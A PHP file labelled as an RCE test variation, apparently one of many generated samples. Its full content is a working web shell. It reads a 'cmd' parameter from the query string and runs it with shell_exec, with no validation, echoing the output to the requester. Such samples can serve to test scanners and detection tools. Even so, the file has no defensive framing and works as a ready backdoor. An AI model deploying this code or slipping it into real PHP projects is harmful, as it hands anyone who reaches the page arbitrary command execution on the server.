<?php
// RCE test variation #1306
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>